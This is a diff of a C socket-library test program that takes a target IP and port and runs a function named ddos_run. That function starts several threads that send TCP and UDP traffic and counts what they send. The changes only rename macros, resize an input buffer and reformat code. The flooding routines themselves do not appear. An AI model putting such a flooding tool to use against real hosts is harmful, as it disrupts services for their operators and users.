@@ -1,8 +1,7 @@
 ﻿#include <scsocket.h>
-#include <scthreads.h>
 
-#define _INT_HOSTV4		(16)	
-#define _INT_TIMEOUT	(3000)
+#define _INT_HOST   (255)	
+#define _INT_TOUT   (3000)
 
 struct targ {
 	sockaddr_t addr;
@@ -44,8 +43,9 @@ void test_scsocket(void) {
 	// :> 开始统计数据
 	puts("connect count		tcp send count			udp send count");
 	for (;;) {
-		printf(" %"PRIu64"			 %"PRIu64"				 %"PRIu64"\n", arg.connect, arg.tcpsend, arg.udpsend);
-		sh_msleep(_INT_TIMEOUT);
+		printf(" %"PRIu64"			 %"PRIu64"				 %"PRIu64"\n"
+            , arg.connect, arg.tcpsend, arg.udpsend);
+		sh_msleep(_INT_TOUT);
 	}
 }
 
@@ -55,13 +55,13 @@ addr_input(sockaddr_t * addr) {
 	bool flag = true;
 	int rt = 0;
 	uint16_t port;
-	char ip[_INT_HOSTV4] = { 0 };
+	char ip[_INT_HOST + 1] = { 0 };
 
 	puts("Please input ip and port, example :> 127.0.0.1 8088");
 	printf(":> ");
 
 	// 自己重构scanf, 解决注入漏洞
-	while (rt < _INT_HOSTV4 - 1) {
+	while (rt < _INT_HOST) {
 		char c = getchar();
 		if (isspace(c)) {
 			if (flag)
@@ -93,10 +93,10 @@ addr_check(sockaddr_t * addr) {
 		RETURN(false, "socket_stream is error!!");
 	}
 
-	r = socket_connecto(s, addr, _INT_TIMEOUT);
+	r = socket_connecto(s, addr, _INT_TOUT);
 	socket_close(s);
 	if (r < SufBase) {
-		RETURN(false, "socket_connecto addr is timeout = %d.", _INT_TIMEOUT);
+		RETURN(false, "socket_connecto addr is timeout = %d.", _INT_TOUT);
 	}
 
 	return true;
@@ -171,7 +171,7 @@ ddos_run(struct targ * arg) {
 	CERR_IF(async_run(_tcpsend, arg));
 	CERR_IF(async_run(_tcpsend, arg));
 
-	// 创建两个 _udpsend 线程
+	// 创建两个 udp send 线程
 	CERR_IF(async_run(_udpsend, arg));
 	CERR_IF(async_run(_udpsend, arg));
 }
